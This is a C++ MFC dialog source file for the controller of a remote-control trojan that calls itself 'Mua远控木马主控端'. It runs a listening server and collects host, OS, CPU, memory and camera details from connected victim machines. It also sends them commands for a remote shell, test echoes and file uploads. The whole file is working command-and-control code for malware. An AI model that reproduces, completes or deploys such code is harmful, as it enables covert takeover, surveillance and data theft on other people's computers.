
// MFCApplication4Dlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "MFCApplication4.h"
#include "MFCApplication4Dlg.h"
#include "afxdialogex.h"
#include "ModuleShellRemote.h"
#include "resource.h"
#include "ModuleManage.h"

#include "Misc.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif




#define DEFAULT_ADDRESS (L"0.0.0.0")
#define DEFAULT_PORT (L"5555")




// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()







// CMFCApplication4Dlg 对话框

CMFCApplication4Dlg::CMFCApplication4Dlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_MFCAPPLICATION4_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMFCApplication4Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST2, m_ListCtrl);
	DDX_Control(pDX, IDC_EDIT1, m_EditIpAddress);
	DDX_Control(pDX, IDC_EDIT2, m_EditPort);
	DDX_Control(pDX, IDC_BUTTON1, m_ButtonStartSocketServer);
	DDX_Control(pDX, IDC_BUTTON2, m_ButtonStopSocketServer);
}

BEGIN_MESSAGE_MAP(CMFCApplication4Dlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_NOTIFY(LVN_ITEMCHANGED, IDC_LIST2, &CMFCApplication4Dlg::OnLvnItemchangedList2)
	ON_EN_CHANGE(IDC_EDIT1, &CMFCApplication4Dlg::OnEnChangeEdit1)
	ON_BN_CLICKED(IDC_BUTTON1, &CMFCApplication4Dlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CMFCApplication4Dlg::OnBnClickedButton2)
	ON_NOTIFY(NM_RCLICK, IDC_LIST2, &CMFCApplication4Dlg::OnRClickMenu)		// 右键菜单

	// 我自己添加的消息处理
	ON_MESSAGE(WM_RECV_LOGIN_PACKET, OnRecvLoginPacket)
	ON_MESSAGE(WM_SOCKET_CLIENT_DISCONNECT, OnSocketClientDisconnect)

//	ON_MESSAGE(WM_RECV_SHELL_CONNECT_PACKET, OnRecvShellConnectPacket)

	ON_MESSAGE(WM_RECV_CHILD_SOCKET_CLIENT_PACKET, OnPostMsgRecvChildSocketClientPacket)
	ON_MESSAGE(WM_RECV_MAIN_SOCKET_CLIENT_PACKET, OnPostMsgRecvMainSocketClientPacket)

	// 右键菜单
	ON_COMMAND(ID_32771, OnTouchDisconnectClient)

	ON_COMMAND(ID_32772, &CMFCApplication4Dlg::OnOpenRemoteShell)
	ON_COMMAND(ID_32773, &CMFCApplication4Dlg::OnTouchTestEcho)
	ON_COMMAND(ID_32774, &CMFCApplication4Dlg::OnTestFileUpload)
END_MESSAGE_MAP()


// CMFCApplication4Dlg 消息处理程序

BOOL CMFCApplication4Dlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	// 窗口标题
	this->SetWindowText(L"Mua远控木马主控端    By iyzyi@BXS");

	// 以下是List Control
	//标题所需字段
	CString head[] = { TEXT(""),TEXT("IP"), TEXT("端口"), TEXT("计算机名"), TEXT("操作系统"), TEXT("CPU"), TEXT("内存"), TEXT("摄像头")};

	//插入列标题
	m_ListCtrl.InsertColumn(0, head[0], LVCFMT_LEFT, 0);			// 仅用于创建本行，长度设为0，不在图像界面的列表中显示
	m_ListCtrl.InsertColumn(1, head[1], LVCFMT_LEFT, 110);
	m_ListCtrl.InsertColumn(2, head[2], LVCFMT_LEFT, 50);
	m_ListCtrl.InsertColumn(3, head[3], LVCFMT_LEFT, 150);
	m_ListCtrl.InsertColumn(4, head[4], LVCFMT_LEFT, 150);
	m_ListCtrl.InsertColumn(5, head[5], LVCFMT_LEFT, 350);
	m_ListCtrl.InsertColumn(6, head[6], LVCFMT_LEFT, 150);
	m_ListCtrl.InsertColumn(7, head[7], LVCFMT_LEFT, 60);

	//设置风格样式
	//LVS_EX_GRIDLINES 网格
	//LVS_EX_FULLROWSELECT 选中整行
	m_ListCtrl.SetExtendedStyle(m_ListCtrl.GetExtendedStyle()
		| LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);
	// 以上是List Control


	// 以下是文本框的初始化内容
	m_EditIpAddress.SetWindowText(DEFAULT_ADDRESS);
	m_EditPort.SetWindowText(DEFAULT_PORT);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CMFCApplication4Dlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMFCApplication4Dlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMFCApplication4Dlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CMFCApplication4Dlg::OnOK()
{
	//什么也不写
}  

//然后重载PreTranslateMessage函数  
//把ESC键的消息，用RETURN键的消息替换，这样，按ESC的时候，也会执行刚才的OnOK函数  
BOOL CMFCApplication4Dlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_ESCAPE)
	{
		pMsg->wParam = VK_RETURN;   //将ESC键的消息替换为回车键的消息，这样，按ESC的时候  
									//也会去调用OnOK函数，而OnOK什么也不做，这样ESC也被屏蔽  
	}
	return   CDialog::PreTranslateMessage(pMsg);
}



//// 按下远程Shell按钮
//void CMFCApplication4Dlg::OnBnClickedOk()
//{
//	RemoteShell *dlg = new RemoteShell();
//	dlg->Create(IDD_DIALOG1, GetDesktopWindow());
//	dlg->ShowWindow(SW_SHOW);
//}
//
//
//// 按下取消按钮
//void CMFCApplication4Dlg::OnBnClickedCancel()
//{
//	
//}




void CMFCApplication4Dlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
}


void CMFCApplication4Dlg::OnEnChangeEdit1()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	// TODO:  在此添加控件通知处理程序代码
}









// 开始监听按钮
void CMFCApplication4Dlg::OnBnClickedButton1()
{
	CString csIpAddress;
	m_EditIpAddress.GetWindowText(csIpAddress);
	LPCTSTR lpszIpAddress = csIpAddress.AllocSysString();

	CString csPort;
	m_EditPort.GetWindowText(csPort);

	DWORD dwTemp = _ttoi(csPort);
	if (!(csPort.GetAllocLength() <= 5 && dwTemp <= 65535)) {		// 判断字符串长度，是为了防止_ttoi整数溢出
		MessageBox(L"监听端口格式错误", L"启动SocketServer失败");
		return;
	}

	USHORT wPort = (USHORT)dwTemp;
	if (!theApp.m_Server.IsRunning()) {
		//BOOL bRet = theApp.m_Server.StartSocketServer(MainSocketRecvPacket, ChildSocketRecvPacket, lpszIpAddress, wPort);
		BOOL bRet = theApp.m_Server.StartSocketServer(lpszIpAddress, wPort);
		if (!bRet) {
			WCHAR pszErrorDesc[512];
			MultiByteToWideChar(CP_ACP, 0, (LPCCH)theApp.m_Server.m_pTcpPackServer->GetLastErrorDesc(), -1, (LPWSTR)pszErrorDesc, 512);
			MessageBox((LPWSTR)pszErrorDesc, L"启动SocketServer失败", 0);
		}
		else {
			m_ButtonStartSocketServer.EnableWindow(false);		// 按钮变灰
		}
	}
	//else {
	//	MessageBox(L"SocketServer已启动，请先关闭监听，再开始监听");
	//}
}


// 关闭监听
void CMFCApplication4Dlg::OnBnClickedButton2()
{
	if (theApp.m_Server.IsRunning()) {
		BOOL bRet = theApp.m_Server.StopSocketServer();
		if (!bRet) {
			MessageBox(L"关闭SocketServer失败");
		}
		else {
			m_ButtonStartSocketServer.EnableWindow(true);
		}
	}
}


// 接收到上线包后触发的消息处理函数
// 封包的有效性由触发点处的代码判断，能传进来的就是有效的
afx_msg LRESULT CMFCApplication4Dlg::OnRecvLoginPacket(WPARAM wParam, LPARAM lParam) {

	CPacket* pPacket = (CPacket*)lParam;
	LOGIN_INFO LoginInfo(pPacket->m_pbPacketBody);

	//CHAR szConnectId[15];
	//_itoa_s(pPacket->m_pClient->m_dwConnectId, szConnectId, 15);	// 从数字转成CHAR字符串

	CHAR szPort[10];
	_itoa_s(pPacket->m_pSocketClient->m_wPort, szPort, 10);

	USES_CONVERSION;									// 使用A2W之前先声明这个

	DWORD dwInsertIndex = m_ListCtrl.GetItemCount();	// 插入到列表尾部

	LV_ITEM   lvitemData = { 0 };
	lvitemData.mask = LVIF_PARAM;
	lvitemData.iItem = dwInsertIndex;
	lvitemData.lParam = (LPARAM)(pPacket->m_pClient);	// 额外的信息，这里用于保存本行对应的pClient

	m_ListCtrl.InsertItem(&lvitemData);					// 第一列，ID。
	//m_ListCtrl.InsertItem(0, A2W(szConnectId));								
	m_ListCtrl.SetItemText(dwInsertIndex, 1, pPacket->m_pClient->m_lpszIpAddress);		// IP
	m_ListCtrl.SetItemText(dwInsertIndex, 2, A2W(szPort));								// 端口
	m_ListCtrl.SetItemText(dwInsertIndex, 3, A2W(LoginInfo.szHostName));				// 计算机名
	m_ListCtrl.SetItemText(dwInsertIndex, 4, A2W(LoginInfo.szOsVersion));				// 操作系统
	m_ListCtrl.SetItemText(dwInsertIndex, 5, A2W(LoginInfo.szCpuType));					// CPU
	m_ListCtrl.SetItemText(dwInsertIndex, 6, A2W(LoginInfo.szMemoryInfo));				// 内存
	m_ListCtrl.SetItemText(dwInsertIndex, 7, A2W(LoginInfo.bHaveCamera ? "有" : "无"));	// 摄像头

	delete pPacket;			// 用完了一定要释放啊
	return 0;
}


// socket连接中断(包括主socket和子socket)
afx_msg LRESULT CMFCApplication4Dlg::OnSocketClientDisconnect(WPARAM wParam, LPARAM lParam) {
	CONNID dwConnectId = (CONNID)wParam;

	// 找到该ConnectId对应的CSocketClient对象
	CSocketClient* pSocketClient = theApp.m_Server.m_pClientManage->SearchSocketClient(dwConnectId);
	ASSERT(pSocketClient != NULL);

	CClient* pClientTemp = NULL;

	// 如果是主socket，那么从ListCtrl列表中删掉该客户端的信息，并令其所有子socket断开连接
	if (pSocketClient->m_bIsMainSocketServer) {
		DWORD dwIndex;
		for (dwIndex = 0; dwIndex < m_ListCtrl.GetItemCount(); dwIndex++) {
			// 获取所枚举的这一行的额外信息，pClient
			LV_ITEM  lvitemData = { 0 };
			lvitemData.mask = LVIF_PARAM;
			lvitemData.iItem = dwIndex;
			m_ListCtrl.GetItem(&lvitemData);
			pClientTemp = (CClient*)lvitemData.lParam;

			// 确定要删除的那行的索引，并删除这一行
			if (dwConnectId == pClientTemp->m_pMainSocketClient->m_dwConnectId) {
				m_ListCtrl.DeleteItem(dwIndex);
				break;
			}
		}

		// 令其所有子socket断开连接（仅disconnect，并没有析构之类的）
		pClientTemp->DisConnectedAllChildSocketClient();

		// 从CClientManage链表中删除此CClient（有析构m_pMainSocketClient）
		theApp.m_Server.m_pClientManage->DeleteClientFromList(pClientTemp);

	}
	// 子socket
	else {

		// 关闭相应的打开的对话框。
		CDialogEx* DialogExTemp = ((CDialogEx*)(pSocketClient->m_DialogInfo.pClassAddress));
		if (DialogExTemp != nullptr) {
			DialogExTemp->SendMessage(WM_CLOSE);
		}

		// 从CClient的链表中删除此CSocketClient。仅删结点，无析构。
		__try {
			// 下面的判断其实根本没有用，m_pClient析构的时候，delete的哪个指针被我手动置nullptr了，
			// 但是这个pSocketClient对象中的m_pClient早就把这个指针拷贝了一份，这个没置nullptr，由此指针悬空。
			// 查了下，也没有什么很好的解决方案，先暂时捕捉异常吧，以后可能改成智能指针之类的。 TODO 
			if (pSocketClient->m_pClient != nullptr) {
				pSocketClient->m_pClient->DeleteChildSocketClientFromList(pSocketClient);
			}
		}
		__finally{}

		// 从CClientManage的链表中删除此CSocketClient。有析构
		theApp.m_Server.m_pClientManage->DeleteChildSocketClientFromList(pSocketClient->m_dwConnectId);
	}
	return 0;
}


	//CONNID dwConnectId = (CONNID)wParam;

	//// 找到该ConnectId对应的Client对象
	//CSocketClient* pClient = theApp.m_Server.m_ClientManage.SearchClient(dwConnectId);
	//ASSERT(pClient != NULL);			// pClient肯定不为NULL

	//CSocketClient* pClientTemp = NULL;

	//// 如果是主socket，那么从ListCtrl列表中删掉该客户端的信息
	//if (pClient->m_bIsMainSocketServer){
	//	DWORD dwIndex;
	//	for (dwIndex = 0; dwIndex < m_ListCtrl.GetItemCount(); dwIndex++) {
	//		// 获取所枚举的这一行的额外信息，pClient
	//		LV_ITEM  lvitemData = { 0 };
	//		lvitemData.mask = LVIF_PARAM;
	//		lvitemData.iItem = dwIndex;
	//		m_ListCtrl.GetItem(&lvitemData);
	//		pClientTemp = (CSocketClient*)lvitemData.lParam;

	//		// 确定要删除的那行的索引，并删除这一行
	//		if (dwConnectId == pClientTemp->m_dwConnectId) {
	//			m_ListCtrl.DeleteItem(dwIndex);
	//			//MessageBox(L"下线！");
	//			break;
	//		}
	//	}
	//}
	//// 如果是子socket，则关闭相应的打开的对话框。
	//else {
	//	((CDialogEx*)(pClient->m_DialogInfo.pClassAddress))->SendMessage(WM_CLOSE);
	//}
	//
	//// 从Client链表中删掉这个Client，包括delete之类的清理工作
	//theApp.m_Server.m_ClientManage.DeleteClientFromList(pClient);		// 在这个函数里delete pClient
	//
	//return 0;


//// 收到SHELL_CONNECT封包时创建相应的对话框
//afx_msg LRESULT CMFCApplication4Dlg::OnRecvShellConnectPacket(WPARAM wParam, LPARAM lParam) {
//	//CClient* pClient = (CClient*)lParam;
//	//CShellRemote* pDlg = new CShellRemote(nullptr, pClient);				// 创建对话框
//	//pClient->m_DialogInfo = { SHELL_REMOTE_DLG, pDlg->m_hWnd, pDlg };		// TODO 句柄不知道有木有问题，记得回来检查
//	return 0;
//}
//





// 主socket接收到有效封包时回调此函数
//void CALLBACK CMFCApplication4Dlg::MainSocketRecvPacket(CPacket *pPacket) {
//	printf("回调MainSocketRecvPacket\n");
//
//	switch (pPacket->m_pClient->m_dwSocketClientStatus) {			// 客户端的不同状态
//
//	case WAIT_FOR_LOGIN:									// 服务端已经接收了客户端发来的密钥了，等待上线包
//			
//		// 这个阶段，只要不是上线包，通通丢弃。
//		if (pPacket->m_PacketHead.wCommandId == LOGIN && pPacket->m_dwPacketBodyLength == LOGIN_PACKET_BODY_LENGTH) {
//			theApp.m_pMainWnd->PostMessage(WM_RECV_LOGIN_PACKET, 0, (LPARAM)pPacket);
//			pPacket->m_pClient->m_dwSocketClientStatus = LOGINED;
//			theApp.m_Server.SendPacket(pPacket->m_pClient, LOGIN, NULL, 0);			// 通知客户端已成功登录
//		}
//
//	case LOGINED:											// 接收上线包后，状态变为已登录。开始正常通信。
//		
//		switch (pPacket->m_PacketHead.wCommandId) {
//
//		case ECHO:
//			printf("接收到ECHO回显包，明文内容如下：\n");
//			PrintData(pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);
//			break;
//
//		default:
//			break;
//		}
//	}
//
//}


// 子socket接收到有效封包时回调此函数
//void CALLBACK CMFCApplication4Dlg::ChildSocketRecvPacket(CPacket *pPacket) {
//	//printf("回调ChildSocketRecvPacket\n");
//
//	//switch (pPacket->m_PacketHead.wCommandId) {
//	//	
//	//case SHELL_CONNECT:
//	//case SHELL_EXECUTE:
//	//case SHELL_CLOSE:
//	//	//printf("HELLO\n");
//	//	OnRecvShellRemotePacket(pPacket);
//	//	break;
//
//
//	//default:
//	//	break;
//	//}
//}


// 按下右键时触发，选择客户端时显示右键菜单
void CMFCApplication4Dlg::OnRClickMenu(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码

	// 选中了客户端后，才显示右键菜单
	if (m_ListCtrl.GetSelectedCount() <= 0) {
		*pResult = 0;
		return;
	}

	CMenu menu;
	POINT pt = { 0 };
	GetCursorPos(&pt);												//得到鼠标点击位置
	menu.LoadMenu(IDR_MENU1);										//菜单资源ID

	// menu.GetSubMenu(0)->TrackPopupMenu(0, pt.x, pt.y, &m_ListCtrl);
	// 上面的写法能搞出右键菜单出来，但是死活触发不了右键菜单里的菜单事件
	// 搞了好久，最后参见https://blog.csdn.net/qq_36568418/article/details/90513390
	menu.GetSubMenu(0)->TrackPopupMenu(0, pt.x, pt.y, this);		// 显示右键菜单

	*pResult = 0;
}


// 右键菜单：断开连接
// 淦，ON_COMMAND的映射函数不能放参数
afx_msg void CMFCApplication4Dlg::OnTouchDisconnectClient() {

	UINT i, uSelectedCount = m_ListCtrl.GetSelectedCount();
	int  nItem = -1;

	CClient* pClient = NULL;

	if (uSelectedCount > 0)
	{
		for (i = 0; i < uSelectedCount; i++)
		{
			nItem = m_ListCtrl.GetNextItem(nItem, LVNI_SELECTED);
			ASSERT(nItem != -1);
			
			LV_ITEM  lvitemData = { 0 };
			lvitemData.mask = LVIF_PARAM;
			lvitemData.iItem = nItem;
			m_ListCtrl.GetItem(&lvitemData);
			pClient = (CClient*)lvitemData.lParam;

			ASSERT(pClient != NULL);		// 逻辑上不可能为NULL
			if (pClient != NULL) {
				// 删掉所有子socket
				//pClient->DeleteAllSocketClientFromList();
				// 删掉此客户端
				//delete pClient;

				// 上面的处理和OnClose()时的处理冲突了，所以这里改成仅关闭socket连接，
				// 然后OnClose()时再做相应的删链表以及析构相关对象的处理
				theApp.m_Server.m_pTcpPackServer->Disconnect(pClient->m_pMainSocketClient->m_dwConnectId);
			}
		}
	}
}


// 右键菜单-远程SHELL
void CMFCApplication4Dlg::OnOpenRemoteShell()
{
	ProcessRClickSelectCommand(SHELL_CONNECT, NULL, 0);
}


// 右键菜单-测试发包
void CMFCApplication4Dlg::OnTouchTestEcho()
{
	UINT i, uSelectedCount = m_ListCtrl.GetSelectedCount();
	int  nItem = -1;

	CClient* pClient = NULL;

	if (uSelectedCount > 0)
	{
		for (i = 0; i < uSelectedCount; i++)
		{
			nItem = m_ListCtrl.GetNextItem(nItem, LVNI_SELECTED);
			ASSERT(nItem != -1);

			LV_ITEM  lvitemData = { 0 };
			lvitemData.mask = LVIF_PARAM;
			lvitemData.iItem = nItem;
			m_ListCtrl.GetItem(&lvitemData);
			pClient = (CClient*)lvitemData.lParam;

			ASSERT(pClient != NULL);		// 逻辑上不可能为NULL
			if (pClient != NULL) {

				// 测试ECHO
				CHAR pszText[] = \
					"To me, you are still nothing more than a little boy who is just like "\
					"a hundred thousand other little boys. And I have no need of you. And you"\
					", on your part, have no need of me. To you, I am nothing more than a fox"\
					" like a hundred thousand other foxes. But if you tame me, then we shall "\
					"need each other. To me, you will be unique in all the world. To you, I "\
					"shall be unique in all the world.";

				theApp.m_Server.SendPacket(pClient->m_pMainSocketClient, ECHO, (PBYTE)pszText, strlen(pszText));
			}
		}
	}
}


// 向被控端(支持多选被控端)发送右键菜单中选择的命令，如远程SHELL
void CMFCApplication4Dlg::ProcessRClickSelectCommand(COMMAND_ID Command, PBYTE pbPacketBody, DWORD dwPacketBodyLength) {
	UINT i, uSelectedCount = m_ListCtrl.GetSelectedCount();
	int  nItem = -1;

	CClient* pClient = NULL;

	if (uSelectedCount > 0)
	{
		for (i = 0; i < uSelectedCount; i++)
		{
			nItem = m_ListCtrl.GetNextItem(nItem, LVNI_SELECTED);
			ASSERT(nItem != -1);

			LV_ITEM  lvitemData = { 0 };
			lvitemData.mask = LVIF_PARAM;
			lvitemData.iItem = nItem;
			m_ListCtrl.GetItem(&lvitemData);
			pClient = (CClient*)lvitemData.lParam;

			ASSERT(pClient != NULL);		// 逻辑上不可能为NULL
			if (pClient != NULL) {
				theApp.m_Server.SendPacket(pClient->m_pMainSocketClient, Command, pbPacketBody, dwPacketBodyLength);		// 发送命令包（只有包头没有包体）
			}
		}
	}
}








// 主socket收到packet时，通过PostMessage传递消息后调用
afx_msg LRESULT CMFCApplication4Dlg::OnPostMsgRecvMainSocketClientPacket(WPARAM wParam, LPARAM lParam) {
	printf("OnPostMsgRecvMainSocketClientPacket\n");
	CPacket* pPacket = (CPacket*)lParam;
	CSocketClient* pSocketClient = pPacket->m_pSocketClient;


	switch (pSocketClient->m_dwSocketClientStatus) {			// 客户端的不同状态

	case WAIT_FOR_LOGIN:									// 服务端已经接收了客户端发来的密钥了，等待上线包

		// 这个阶段，只要不是上线包，通通丢弃。
		if (pPacket->m_PacketHead.wCommandId == LOGIN && pPacket->m_dwPacketBodyLength == LOGIN_PACKET_BODY_LENGTH) {
			PostMessage(WM_RECV_LOGIN_PACKET, 0, (LPARAM)pPacket);
			pSocketClient->m_dwSocketClientStatus = LOGINED;
			theApp.m_Server.SendPacket(pSocketClient, LOGIN, NULL, 0);			// 通知客户端已成功登录
		}
		
		break;

	case LOGINED:											// 接收上线包后，状态变为已登录。开始正常通信。

		switch (pPacket->m_PacketHead.wCommandId) {

		case ECHO:
			printf("接收到ECHO回显包，明文内容如下：\n");
			PrintData(pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);
			break;



		default:
			break;
		}

	default:
		break;
	}
	return 0;
}







// 处理子socket发来的第一个封包，比如SHELL_CONNECT包，返回是否处理了该包
BOOL CMFCApplication4Dlg::ProcessConnectPacket(CPacket* pPacket) {
	CSocketClient* pSocketClient = pPacket->m_pSocketClient;
	CModule* pModule = pSocketClient->m_pModule;

	switch (pPacket->m_PacketHead.wCommandId) {

	case SHELL_CONNECT:
		RunShellRemote(pSocketClient);
		break;
		
	case FILE_UPLOAD_CONNECT:
		RunFileUpload(pSocketClient);
		break;

	default:
		return false;
	}
	return true;
}


// 子socket收到packet时，通过PostMessage传递消息后调用
afx_msg LRESULT CMFCApplication4Dlg::OnPostMsgRecvChildSocketClientPacket(WPARAM wParam, LPARAM lParam) {
	printf("OnPostMsgRecvChildSocketClientPacket\n");
	CPacket* pPacket = (CPacket*)lParam;
	CSocketClient* pSocketClient = pPacket->m_pSocketClient;
	CModule* pModule = pSocketClient->m_pModule;

	BOOL bRet = ProcessConnectPacket(pPacket);				// CONNECT包。因为涉及初始化，所以必须单独拿出来处理
	
	if (!bRet) {
		ASSERT(pModule != nullptr);	
		pModule->OnRecvChildSocketClientPacket(pPacket);	// 非CONNECT包
	}

	return 0;
}


// 测试文件上传
void CMFCApplication4Dlg::OnTestFileUpload()
{	
	WCHAR pszFile[MAX_PATH] = L"C:\\Users\\iyzyi\\Desktop\\测试文件传输\\server\\发送\\测试文件传输，可删.7z";
	if (!PathFileExists(pszFile)) {
		MessageBox(L"文件不存在");
		return ;
	}

	HANDLE hFile = CreateFile(pszFile, FILE_READ_EA, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		MessageBox(L"文件句柄打开失败");
		return ;
	}

	QWORD qwFileSize = 0;
	DWORD dwFileSizeLowDword = 0;
	DWORD dwFileSizeHighDword = 0;
	dwFileSizeLowDword = GetFileSize(hFile, &dwFileSizeHighDword);
	qwFileSize = (((QWORD)dwFileSizeHighDword) << 32) + dwFileSizeLowDword;		// 直接dwFileSizeHighDword << 32的话就等于0了


	#define FILE_UPLOAD_PACKET_BODY_LENGTH 16
	BYTE pbPacketBody[FILE_UPLOAD_PACKET_BODY_LENGTH];
	memset(pbPacketBody, 0, FILE_UPLOAD_PACKET_BODY_LENGTH);
	// 包体：文件大小（8Byte）+ 分片数（4字节）+ 暂未分配（4字节）

	// 除非文件16383TB, 否则dwPacketSplitNum不可能上溢。所以不用担心整数溢出。担心这个还不如担心文件完整性校验。
	DWORD dwPacketSplitNum = (qwFileSize % PACKET_MAX_LENGTH) ? qwFileSize / PACKET_MAX_LENGTH + 1 : qwFileSize / PACKET_MAX_LENGTH;
	WriteQwordToBuffer(pbPacketBody, qwFileSize, 0);
	WriteDwordToBuffer(pbPacketBody, dwPacketSplitNum, 8);

	ProcessRClickSelectCommand(FILE_UPLOAD_CONNECT, (PBYTE)pbPacketBody, FILE_UPLOAD_PACKET_BODY_LENGTH);

	//WaitForSingleObject(m_FileUploadConnectSuccessEvent, INFINITE);
}